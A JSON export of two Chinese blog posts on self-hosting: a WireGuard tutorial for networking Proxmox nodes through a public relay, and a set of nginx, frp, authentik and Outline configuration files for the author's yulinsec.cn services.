[{"content":"核心是“公网中转节点（WireGuard服务端）+ PVE节点（WireGuard客户端）+ 外地设备（WireGuard客户端）”的架构\n准备环境 必需组件： 1台带公网IP的中转服务器 2台PVE服务器（每台部署1台Linux虚拟机作为WireGuard客户端，也可直接在PVE宿主机部署）； 外地设备（电脑/手机，安装WireGuard客户端）。 虚拟网段规划： 中转节点WireGuard IP：10.0.0.1/24 PVE服务器1的WireGuard IP：10.0.0.2/24 PVE服务器2的WireGuard IP：10.0.0.3/24 外地设备的WireGuard IP：10.0.0.10~20/24 在中转节点部署WireGuard服务端 1. 安装WireGuard 1 2 # Debian/Ubuntu系统 apt update \u0026amp;\u0026amp; apt install wireguard iptables -y 2. 生成密钥对 1 2 3 4 5 6 # 生成服务端私钥和公钥 wg genkey | tee /etc/wireguard/privatekey | wg pubkey \u0026gt; /etc/wireguard/publickey # 查看密钥（后续配置需要） cat /etc/wireguard/privatekey # 服务端私钥，记为S_PRI cat /etc/wireguard/publickey # 服务端公钥，记为S_PUB 3. 配置WireGuard服务端（/etc/wireguard/wg0.conf） 1 2 3 4 5 6 7 8 [Interface] PrivateKey = S_PRI # 替换为服务端私钥 Address = 10.0.0.1/24, 192.168.1.0/24 # 中转节点的虚拟IP 以及内网 ListenPort = 51820 # WireGuard默认端口 # 开启IP转发（让中转节点转发不同客户端的流量） PostUp = echo 1 \u0026gt; /proc/sys/net/ipv4/ip_forward PostUp = iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE # eth0是中转节点的公网网卡 PostDown = iptables -t nat -D POSTROUTING -o eth0 -j MASQUERADE 4. 启动服务并设置开机自启 1 2 wg-quick up wg0 systemctl enable wg-quick@wg0 5. 开放中转节点的防火墙端口 在中转节点的云服务商控制台（如阿里云/甲骨文云），开放UDP 51820端口（WireGuard用UDP传输）。\n在PVE节点部署WireGuard客户端 以“PVE服务器1”为例（PVE服务器2配置完全一致，仅虚拟IP改为10.0.0.3）：\n1. 安装WireGuard（PVE宿主机/虚拟机均可） 1 2 # PVE宿主机是Debian系统，直接安装 apt update \u0026amp;\u0026amp; apt install wireguard -y 2. 生成PVE节点的密钥对 1 2 3 4 5 wg genkey | tee /etc/wireguard/privatekey | wg pubkey \u0026gt; /etc/wireguard/publickey # 查看密钥（后续配置需要） cat /etc/wireguard/privatekey # PVE1私钥，记为P1_PRI cat /etc/wireguard/publickey # PVE1公钥，记为P1_PUB 3. 配置WireGuard客户端（/etc/wireguard/wg0.conf） 1 2 3 4 5 6 7 8 9 [Interface] PrivateKey = P1_PRI # 替换为PVE1的私钥 Address = 10.0.0.2/24 # PVE1的虚拟IP [Peer] PublicKey = S_PUB # 替换为中转节点的公钥 Endpoint = 中转节点公网IP:51820 # 如123.45.67.89:51820 AllowedIPs = 10.0.0.0/24, 192.168.1.0/24 # 中转节点的虚拟IP 以及内网 PersistentKeepalive = 25 # 保持内网穿透连接（避免NAT超时） 4. 启动客户端并设置开机自启 1 2 wg-quick up wg0 systemctl enable wg-quick@wg0 在外地设备部署WireGuard客户端 以Windows为例：\n下载WireGuard客户端：官网下载； 打开客户端，点击“新建隧道”，输入配置： 1 2 3 4 5 6 7 8 9 [Interface] PrivateKey = 本地生成的私钥 # 点击客户端的“生成密钥对”自动生成 Address = 10.0.0.10/24 # 外地设备的虚拟IP [Peer] PublicKey = S_PUB # 中转节点的公钥 Endpoint = 中转节点公网IP:51820 AllowedIPs = 10.0.0.0/24 # 仅访问虚拟网段（也可填0.0.0.0/0实现全局代理） PersistentKeepalive = 25 保存后点击“激活”，即可接入虚拟网络。 验证组网是否成功 ping 192.168.31.213 dockerhost 的ip\n","date":"2025-11-24T00:00:00Z","permalink":"https://calendar0917.github.io/posts/devops-wireguard/","title":"使用 wireguard 进行 pve 组网"},{"content":"/etc/nginx 3000 homepage\n3030 outline\n9000 authentik\n9111 portainer\n8484 grist\n51821 wg-gen-web\nnginx.conf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 user www-data; worker_processes auto; pid /run/nginx.pid; error_log /var/log/nginx/error.log; include /etc/nginx/modules-enabled/*.conf; events { worker_connections 768; # multi_accept on; } http { ## # Basic Settings ## sendfile on; tcp_nopush on; types_hash_max_size 2048; # server_tokens off; # server_names_hash_bucket_size 64; # server_name_in_redirect off; include /etc/nginx/mime.types; default_type application/octet-stream; ## # SSL Settings ## ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE ssl_prefer_server_ciphers on; ## # Logging Settings ## access_log /var/log/nginx/access.log; ## # Gzip Settings ## gzip on; # gzip_vary on; # gzip_proxied any; # gzip_comp_level 6; # gzip_buffers 16 8k; # gzip_http_version 1.1; # gzip_types text/plain text/css application/json application/javascript text/xml application/xml application/xml+rss text/javascript; ## # Virtual Host Configs ## include /etc/nginx/conf.d/*.conf; include /etc/nginx/sites-enabled/*; } #mail { # # See sample authentication script at: # # http://wiki.nginx.org/ImapAuthenticateWithApachePhpScript # # # auth_http localhost/auth.php; # # pop3_capabilities \u0026#34;TOP\u0026#34; \u0026#34;USER\u0026#34;; # # imap_capabilities \u0026#34;IMAP4rev1\u0026#34; \u0026#34;UIDPLUS\u0026#34;; # # server { # listen localhost:110; # protocol pop3; # proxy on; # } # # server { # listen localhost:143; # protocol imap; # proxy on; # } #} conf.d/auth.conf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 # Upstream where your authentik server is hosted. upstream authentik { server 127.0.0.1:9443; # Improve performance by keeping some connections alive. keepalive 10; } # Upgrade WebSocket if requested, otherwise use keepalive map $http_upgrade $connection_upgrade_keepalive { default upgrade; \u0026#39;\u0026#39; \u0026#39;\u0026#39;; } server { # HTTP server config server_name auth.yulinsec.cn; #Real IP From Frp set_real_ip_from 127.0.0.0/8; real_ip_header proxy_protocol; # Proxy site # Location can be set to a subpath if desired, see documentation linked below: # https://docs.goauthentik.io/docs/install-config/configuration/#authentik_web__path location / { proxy_pass http://127.0.0.1:9000; proxy_http_version 1.1; proxy_set_header X-Forwarded-Proto $scheme; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header Host $http_host; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection $connection_upgrade_keepalive; } listen 443 ssl proxy_protocol; # managed by Certbot ssl_certificate /etc/letsencrypt/live/auth.yulinsec.cn/fullchain.pem; # managed by Certbot ssl_certificate_key /etc/letsencrypt/live/auth.yulinsec.cn/privkey.pem; # managed by Certbot include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot } server { if ($host = auth.yulinsec.cn) { return 301 https://$host$request_uri; } # managed by Certbot listen 80 proxy_protocol; server_name auth.yulinsec.cn; return 404; # managed by Certbot } conf.d/outline.conf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 server { server_name docs.yulinsec.cn; set_real_ip_from 127.0.0.0/8; real_ip_header proxy_protocol; location / { proxy_pass http://127.0.0.1:3030/; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;Upgrade\u0026#34;; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Scheme $scheme; proxy_set_header X-Forwarded-Proto $scheme; proxy_redirect off; } listen 443 ssl proxy_protocol; # managed by Certbot ssl_certificate /etc/letsencrypt/live/docs.yulinsec.cn/fullchain.pem; # managed by Certbot ssl_certificate_key /etc/letsencrypt/live/docs.yulinsec.cn/privkey.pem; # managed by Certbot include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot } server { if ($host = docs.yulinsec.cn) { return 301 https://$host$request_uri; } # managed by Certbot server_name docs.yulinsec.cn; listen 80 proxy_protocol; return 404; # managed by Certbot } /conf.d/portainer.conf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 server { # 启用 proxy protocol server_name portainer.yulinsec.cn; # 处理 proxy protocol 后可继续使用真实客户端 IP real_ip_header proxy_protocol; set_real_ip_from 127.0.0.0/8; # 按需限制允许发送 proxy protocol 的来源 location / { proxy_pass http://127.0.0.1:9111; # 传递代理头部（客户端真实信息） proxy_set_header Host $host; proxy_set_header X-Real-IP $proxy_protocol_addr; proxy_set_header X-Forwarded-For $proxy_protocol_addr; proxy_set_header X-Forwarded-Proto $scheme; } listen 443 ssl proxy_protocol; # managed by Certbot ssl_certificate /etc/letsencrypt/live/portainer.yulinsec.cn/fullchain.pem; # managed by Certbot ssl_certificate_key /etc/letsencrypt/live/portainer.yulinsec.cn/privkey.pem; # managed by Certbot include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot } server { if ($host = portainer.yulinsec.cn) { return 301 https://$host$request_uri; } # managed by Certbot listen 80 proxy_protocol; server_name portainer.yulinsec.cn; return 404; # managed by Certbot } conf.d/grist.conf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 server { # 配置域名 server_name grist.yulinsec.cn; # 处理真实 IP（保持与其他服务一致） set_real_ip_from 127.0.0.0/8; real_ip_header proxy_protocol; # 反向代理到 grist 服务端口 location / { proxy_pass http://127.0.0.1:8484; # 替换为实际端口 # 通用代理头部配置（保持与其他服务一致） proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;Upgrade\u0026#34;; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Scheme $scheme; proxy_set_header X-Forwarded-Proto $scheme; proxy_redirect off; # WebSocket支持（Grist实时协作依赖） proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;upgrade\u0026#34;; proxy_read_timeout 86400; } # HTTPS 配置（通过 Certbot 自动生成） listen 443 ssl proxy_protocol; ssl_certificate /etc/letsencrypt/live/grist.yulinsec.cn/fullchain.pem; ssl_certificate_key /etc/letsencrypt/live/grist.yulinsec.cn/privkey.pem; include /etc/letsencrypt/options-ssl-nginx.conf; ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; } # HTTP 自动跳转 HTTPS server { if ($host = grist.yulinsec.cn) { return 301 https://$host$request_uri; } listen 80 proxy_protocol; server_name grist.yulinsec.cn; return 404; } conf.d/homepage.conf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 # /etc/nginx/conf.d/homepage.conf server { server_name homepage.yulinsec.cn; # 自定义域名 # 处理真实IP（与其他服务保持一致） set_real_ip_from 127.0.0.0/8; real_ip_header proxy_protocol; location / { proxy_pass http://127.0.0.1:3000; # 代理到本地3000端口 # 通用代理头部配置（与其他服务保持一致） proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;Upgrade\u0026#34;; proxy_set_header Host $host; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Scheme $scheme; proxy_set_header X-Forwarded-Proto $scheme; proxy_redirect off; } # HTTPS配置（通过Certbot生成） #listen 443 ssl proxy_protocol; #ssl_certificate /etc/letsencrypt/live/homepage.yulinsec.cn/fullchain.pem; #ssl_certificate_key /etc/letsencrypt/live/homepage.yulinsec.cn/privkey.pem; #include /etc/letsencrypt/options-ssl-nginx.conf; #ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; } # HTTP自动跳转HTTPS server { if ($host = homepage.yulinsec.cn) { return 301 https://$host$request_uri; } listen 80 proxy_protocol; server_name homepage.yulinsec.cn; return 404; } 1 2 3 4 5 6 7 8 # 生成证书 sudo certbot --nginx -d homepage.yulinsec.cn # 检查配置是否有误 sudo nginx -t # 重启 Nginx 生效 sudo systemctl restart nginx conf.d/wgeasy.conf 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 server { server_name wg-easy.yulinsec.cn; # ⚠️ 修改为你的域名 location / { proxy_pass http://127.0.0.1:8080/; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \u0026#34;Upgrade\u0026#34;; proxy_set_header Host $host; } listen 443 ssl proxy_protocol; # managed by Certbot ssl_certificate /etc/letsencrypt/live/wg-easy.yulinsec.cn/fullchain.pem; # managed by Certbot ssl_certificate_key /etc/letsencrypt/live/wg-easy.yulinsec.cn/privkey.pem; # managed by Certbot include /etc/letsencrypt/options-ssl-nginx.conf; # managed by Certbot ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem; # managed by Certbot } server { if ($host = wg-easy.yulinsec.cn) { return 301 https://$host$request_uri; } # managed by Certbot server_name wg-easy.yulinsec.cn; listen 80 proxy_protocol; return 404; # managed by Certbot } /root/frp frpc.toml 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 # 服务器公网地址 serverAddr = \u0026#34;47.242.81.180\u0026#34; serverPort = 15443 transport.protocol = \u0026#34;tcp\u0026#34; loginFailExit = false # 鉴权配置 [auth] method = \u0026#34;token\u0026#34; token = \u0026#34;……\u0026#34; # 日志配置 [log] level = \u0026#34;info\u0026#34; to = \u0026#34;/root/frp/logs/frpc.log\u0026#34; # 代理配置 [[proxies]] name = \u0026#34;auth-yulinsec-cn-http\u0026#34; type = \u0026#34;http\u0026#34; localIP = \u0026#34;127.0.0.1\u0026#34; localPort = 80 customDomains = [\u0026#34;auth.yulinsec.cn\u0026#34;] transport.proxyProtocolVersion = \u0026#34;v2\u0026#34; [[proxies]] name = \u0026#34;auth-yulinsec-cn-https\u0026#34; type = \u0026#34;https\u0026#34; localIP = \u0026#34;127.0.0.1\u0026#34; localPort = 443 customDomains = [\u0026#34;auth.yulinsec.cn\u0026#34;] transport.proxyProtocolVersion = \u0026#34;v2\u0026#34; [[proxies]] name = \u0026#34;outline-yulinsec-cn-http\u0026#34; type = \u0026#34;http\u0026#34; localIP = \u0026#34;127.0.0.1\u0026#34; localPort = 80 customDomains = [\u0026#34;docs.yulinsec.cn\u0026#34;] transport.proxyProtocolVersion = \u0026#34;v2\u0026#34; [[proxies]] name = \u0026#34;outline-yulinsec-cn-https\u0026#34; type = \u0026#34;https\u0026#34; localIP = \u0026#34;127.0.0.1\u0026#34; localPort = 443 customDomains = [\u0026#34;docs.yulinsec.cn\u0026#34;] transport.proxyProtocolVersion = \u0026#34;v2\u0026#34; [[proxies]] name = \u0026#34;portainer-yulinsec-cn-http\u0026#34; type = \u0026#34;http\u0026#34; localIP = \u0026#34;127.0.0.1\u0026#34; localPort = 80 customDomains = [\u0026#34;portainer.yulinsec.cn\u0026#34;] transport.proxyProtocolVersion = \u0026#34;v2\u0026#34; [[proxies]] name = \u0026#34;portainer-yulinsec-cn-https\u0026#34; type = \u0026#34;https\u0026#34; localIP = \u0026#34;127.0.0.1\u0026#34; localPort = 443 customDomains = [\u0026#34;portainer.yulinsec.cn\u0026#34;] transport.proxyProtocolVersion = \u0026#34;v2\u0026#34; [[proxies]] name = \u0026#34;wiki-yulinsec-cn-http\u0026#34; type = \u0026#34;http\u0026#34; localIP = \u0026#34;127.0.0.1\u0026#34; localPort = 80 customDomains = [\u0026#34;wiki.yulinsec.cn\u0026#34;] transport.proxyProtocolVersion = \u0026#34;v2\u0026#34; [[proxies]] name = \u0026#34;wiki-yulinsec-cn-https\u0026#34; type = \u0026#34;https\u0026#34; localIP = \u0026#34;127.0.0.1\u0026#34; localPort = 443 customDomains = [\u0026#34;wiki.yulinsec.cn\u0026#34;] transport.proxyProtocolVersion = \u0026#34;v2\u0026#34; [[proxies]] name = \u0026#34;grist-yulinsec-cn-http\u0026#34; type = \u0026#34;http\u0026#34; localIP = \u0026#34;127.0.0.1\u0026#34; localPort = 80 customDomains = [\u0026#34;grist.yulinsec.cn\u0026#34;] transport.proxyProtocolVersion = \u0026#34;v2\u0026#34; [[proxies]] name = \u0026#34;grist-yulinsec-cn-https\u0026#34; type = \u0026#34;https\u0026#34; localIP = \u0026#34;127.0.0.1\u0026#34; localPort = 443 customDomains = [\u0026#34;grist.yulinsec.cn\u0026#34;] transport.proxyProtocolVersion = \u0026#34;v2\u0026#34; [[proxies]] name = \u0026#34;homepage-yulinsec-cn-http\u0026#34; type = \u0026#34;http\u0026#34; localIP = \u0026#34;127.0.0.1\u0026#34; localPort = 80 customDomains = [\u0026#34;homepage.yulinsec.cn\u0026#34;] transport.proxyProtocolVersion = \u0026#34;v2\u0026#34; [[proxies]] name = \u0026#34;homepage-yulinsec-cn-https\u0026#34; type = \u0026#34;https\u0026#34; localIP = \u0026#34;127.0.0.1\u0026#34; localPort = 443 customDomains = [\u0026#34;homepage.yulinsec.cn\u0026#34;] transport.proxyProtocolVersion = \u0026#34;v2\u0026#34; 这里貌似冗余，后面处理\n服务 authentik 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 # /root/authentik/docker-compose.yml services: postgresql: env_file: - .env environment: POSTGRES_DB: ${PG_DB:-authentik} POSTGRES_PASSWORD: ${PG_PASS:?database password required} POSTGRES_USER: ${PG_USER:-authentik} healthcheck: interval: 30s retries: 5 start_period: 20s test: - CMD-SHELL - pg_isready -d $${POSTGRES_DB} -U $${POSTGRES_USER} timeout: 5s image: docker.io/library/postgres:16-alpine restart: unless-stopped volumes: - database:/var/lib/postgresql/data server: command: server depends_on: postgresql: condition: service_healthy env_file: - .env environment: AUTHENTIK_POSTGRESQL__HOST: postgresql AUTHENTIK_POSTGRESQL__NAME: ${PG_DB:-authentik} AUTHENTIK_POSTGRESQL__PASSWORD: ${PG_PASS} AUTHENTIK_POSTGRESQL__USER: ${PG_USER:-authentik} AUTHENTIK_SECRET_KEY: ${AUTHENTIK_SECRET_KEY:?secret key required} image: ${AUTHENTIK_IMAGE:-ghcr.io/goauthentik/server}:${AUTHENTIK_TAG:-2025.10.2} ports: - ${COMPOSE_PORT_HTTP:-9000}:9000 - ${COMPOSE_PORT_HTTPS:-9443}:9443 restart: unless-stopped volumes: - ./media:/media - ./custom-templates:/templates worker: command: worker depends_on: postgresql: condition: service_healthy env_file: - .env environment: AUTHENTIK_POSTGRESQL__HOST: postgresql AUTHENTIK_POSTGRESQL__NAME: ${PG_DB:-authentik} AUTHENTIK_POSTGRESQL__PASSWORD: ${PG_PASS} AUTHENTIK_POSTGRESQL__USER: ${PG_USER:-authentik} AUTHENTIK_SECRET_KEY: ${AUTHENTIK_SECRET_KEY:?secret key required} image: ${AUTHENTIK_IMAGE:-ghcr.io/goauthentik/server}:${AUTHENTIK_TAG:-2025.10.2} restart: unless-stopped user: root volumes: - /var/run/docker.sock:/var/run/docker.sock - ./media:/media - ./certs:/certs - ./custom-templates:/templates volumes: database: driver: local outline 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 # /root/outline/docker-compose.yml services: outline: image: outlinewiki/outline:1.1.0 env_file: ./docker.env ports: - \u0026#34;3030:3030\u0026#34; expose: - \u0026#34;3030\u0026#34; volumes: - ./data:/var/lib/outline/data depends_on: - postgres - redis redis: image: redis env_file: ./docker.env expose: - \u0026#34;6379\u0026#34; volumes: - ./redis.conf:/redis.conf command: [\u0026#34;redis-server\u0026#34;, \u0026#34;/redis.conf\u0026#34;] healthcheck: test: [\u0026#34;CMD\u0026#34;, \u0026#34;redis-cli\u0026#34;, \u0026#34;ping\u0026#34;] interval: 10s timeout: 30s retries: 3 postgres: image: postgres:18 env_file: ./docker.env expose: - \u0026#34;5432\u0026#34; volumes: - ./database:/var/lib/postgresql healthcheck: test: [\u0026#34;CMD\u0026#34;, \u0026#34;pg_isready\u0026#34;, \u0026#34;-d\u0026#34;, \u0026#34;outline\u0026#34;, \u0026#34;-U\u0026#34;, \u0026#34;user\u0026#34;] interval: 30s timeout: 20s retries: 3 environment: POSTGRES_USER: \u0026#39;user\u0026#39; POSTGRES_PASSWORD: \u0026#39;pass\u0026#39; POSTGRES_DB: \u0026#39;outline\u0026#39; 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 # /root/outline/docker.env # 汉化了，原文是英文 NODE_ENV=production # 该 URL 应指向完全限定的、可公开访问的地址。若使用代理，此处为代理的 URL URL=https://docs.yulinsec.cn # Outline 服务器暴露的端口，需与 docker-compose.yml 中配置的端口一致 PORT=3030 # 有关运行独立协作服务器的说明，请查看文档(SERVICES.md)，常规运行时无需设置此项 COLLABORATION_URL= # 若使用 Cloudfront/Cloudflare 等分发网络，可在此处配置。 # 配置后，JavaScript、样式表和图片的路径会更新为 CDN_URL 中定义的主机名。 # CDN 配置中的源服务器需与 URL 保持一致 CDN_URL= # 要生成的进程数量。合理的估算规则是：服务器可用内存 ÷ 512（单位：MB） WEB_CONCURRENCY=4 # 生成一个十六进制编码的 32 字节随机密钥。可在终端执行 `openssl rand -hex 32` 生成随机值 SECRET_KEY=... # 生成一个唯一的随机密钥。格式无严格要求，也可通过终端 `openssl rand -hex 32` 生成 UTILS_SECRET=... # 默认界面语言。可在 translate.getoutline.com 查看支持的语言代码及翻译完成度 DEFAULT_LANGUAGE=zh_CN # –––––––––––––––––––––––––––––––––––––– # ––––––––––––– 数据库配置 ––––––––––––– # –––––––––––––––––––––––––––––––––––––– # 生产环境数据库的 URL，包含用户名、密码和数据库名 DATABASE_URL=postgres://user:pass@postgres:5432/outline # 每个进程的内存数据库连接池设置。确保连接池大小不超过数据库允许的最大连接数 # 默认值为最小 0、最大 5 DATABASE_CONNECTION_POOL_MIN= DATABASE_CONNECTION_POOL_MAX= # 若连接 Postgres 不使用 SSL，可取消注释此行。仅当数据库与应用在同一台机器时适用 PGSSLMODE=disable # –––––––––––––––––––––––––––––––––––––– # ––––––––––––– Redis 配置 ––––––––––––– # –––––––––––––––––––––––––––––––––––––– # 环境的 Redis URL，可指定兼容 ioredis 的 URL 或 Base64 编码的配置对象 # 文档：https://docs.getoutline.com/s/hosting/doc/redis-LGM4BFXYp4 REDIS_URL=redis://redis:6379 # –––––––––––––––––––––––––––––––––––––– # ––––––––––– 文件存储配置 ––––––––––– # –––––––––––––––––––––––––––––––––––––– # 指定存储系统类型，可选值为 \u0026#34;s3\u0026#34; 或 \u0026#34;local\u0026#34; # - \u0026#34;local\u0026#34;：图片和文档附件存储在本地磁盘 # - \u0026#34;s3\u0026#34;：存储在兼容 S3 协议的网络存储服务 # 文档：https://docs.getoutline.com/s/hosting/doc/file-storage-N4M0T6Ypu7 FILE_STORAGE=local # 若 FILE_STORAGE 配置为 \u0026#34;local\u0026#34;，此项设置所有附件/图片的存储上级目录 # 确保进程拥有该路径的创建权限和文件写入权限 FILE_STORAGE_LOCAL_ROOT_DIR=/var/lib/outline/data # 上传附件的最大允许大小（单位：字节） FILE_STORAGE_UPLOAD_MAX_SIZE=262144000 # 覆盖文档导入的最大大小，通常应小于文档附件的最大大小 FILE_STORAGE_IMPORT_MAX_SIZE= # 覆盖工作区导入的最大大小，工作区导入文件可能特别大，且为临时文件会被自动定期删除 FILE_STORAGE_WORKSPACE_IMPORT_MAX_SIZE= # 若在分布式架构中支持头像和文档附件的图片上传，且 FILE_STORAGE=s3 时， # 需配置兼容 S3 的存储服务 AWS_ACCESS_KEY_ID=get_a_key_from_aws AWS_SECRET_ACCESS_KEY=get_the_secret_of_above_key AWS_REGION=xx-xxxx-x # –––––––––––––––––––––––––––––––––––––– # ––––––––––– SSL 配置 ––––––––––– # –––––––––––––––––––––––––––––––––––––– # HTTPS 终止的 Base64 编码私钥和证书。这是三种 SSL 配置方式之一，可留空 # 文档：https://docs.getoutline.com/s/hosting/doc/ssl-pzk7WO8d1n SSL_KEY= SSL_CERT= # 生产环境中自动重定向到 HTTPS。默认值为 true，若确定 SSL 在外部负载均衡器终止，可设为 false FORCE_HTTPS=false # –––––––––––––––––––––––––––––––––––––– # ––––––––––– 身份认证配置 ––––––––––– # –––––––––––––––––––––––––––––––––––––– # 第三方登录凭证，至少需要配置 Google、Slack、Discord 或 Microsoft 中的一种， # 否则将无登录选项可用 # Slack 登录提供商 # 文档：https://docs.getoutline.com/s/hosting/doc/slack-sgMujR8J9J SLACK_CLIENT_ID= SLACK_CLIENT_SECRET= # Google 登录提供商 # 文档：https://docs.getoutline.com/s/hosting/doc/google-hOuvtCmTqQ GOOGLE_CLIENT_ID= GOOGLE_CLIENT_SECRET= # Microsoft Entra / Azure AD 登录提供商 # 文档：https://docs.getoutline.com/s/hosting/doc/microsoft-entra-UVz6jsIOcv AZURE_CLIENT_ID= AZURE_CLIENT_SECRET= AZURE_RESOURCE_APP_ID= # Discord 登录提供商 # 文档：https://docs.getoutline.com/s/hosting/doc/discord-g4JdWFFub6 DISCORD_CLIENT_ID= DISCORD_CLIENT_SECRET= DISCORD_SERVER_ID= DISCORD_SERVER_ROLES= # 通用 OIDC 提供商 # 文档：https://docs.getoutline.com/s/hosting/doc/oidc-8CPBm6uC0I OIDC_CLIENT_ID=... OIDC_CLIENT_SECRET=... OIDC_AUTH_URI=https://auth.yulinsec.cn/application/o/authorize/ OIDC_TOKEN_URI=https://auth.yulinsec.cn/application/o/token/ OIDC_USERINFO_URI=https://auth.yulinsec.cn/application/o/userinfo/ OIDC_LOGOUT_URI=https://auth.yulinsec.cn/application/o/outline/end-session/ # 指定从哪些声明中提取用户信息，支持 JWT 载荷中的任意有效 JSON 路径 OIDC_USERNAME_CLAIM=profile # OIDC 认证的显示名称 OIDC_DISPLAY_NAME=YulinSec Auth # 空格分隔的认证作用域 OIDC_SCOPES=openid profile email # –––––––––––––––––––––––––––––––––––––– # ––––––––––– 邮件配置 ––––––––––– # –––––––––––––––––––––––––––––––––––––– # 要支持发送事务性邮件（如“文档已更新”或邮件登录），需连接 SMTP 服务器。 # 可配置的服务列表：https://community.nodemailer.com/2-0-0-beta/setup-smtp/well-known-services/ # 文档：https://docs.getoutline.com/s/hosting/doc/smtp-cqCJyZGMIB SMTP_SERVICE= SMTP_USERNAME= SMTP_PASSWORD= SMTP_FROM_EMAIL= # –––––––––––––––––––––––––––––––––––––– # ––––––––––– 限流配置 ––––––––––– # –––––––––––––––––––––––––––––––––––––– # 是否启用限流功能 RATE_LIMITER_ENABLED=true # 各个端点有硬编码的限流规则（需上述开关启用），此项为所有请求的全局限流 RATE_LIMITER_REQUESTS=1000 RATE_LIMITER_DURATION_WINDOW=60 # –––––––––––––––––––––––––––––––––––––– # ––––––––––– 集成配置 ––––––––––– # –––––––––––––––––––––––––––––––––––––– # GitHub 集成：支持预览 Issues 和 Pull Request 链接 # 文档：https://docs.getoutline.com/s/hosting/doc/github-GchT3NNxI9 GITHUB_CLIENT_ID= GITHUB_CLIENT_SECRET= GITHUB_WEBHOOK_SECRET= GITHUB_APP_NAME= GITHUB_APP_ID= GITHUB_APP_PRIVATE_KEY= # Linear 集成：支持将 Issue 链接预览为富文本提及 LINEAR_CLIENT_ID= LINEAR_CLIENT_SECRET= # Slack 完整集成（含搜索和频道发帖）：除了 Slack 认证外，还需配置以下项 # 文档：https://docs.getoutline.com/s/hosting/doc/slack-G2mc8DOJHk SLACK_VERIFICATION_TOKEN= SLACK_APP_ID= SLACK_MESSAGE_ACTIONS= # Dropbox 集成：按以下说明获取密钥 https://www.dropbox.com/developers/embedder#setup # 并在应用设置中白名单你的域名 DROPBOX_APP_KEY= # 可选启用 Sentry (sentry.io) 跟踪错误和性能 # 文档：https://docs.getoutline.com/s/hosting/doc/sentry-jxcFttcDl5 SENTRY_DSN= 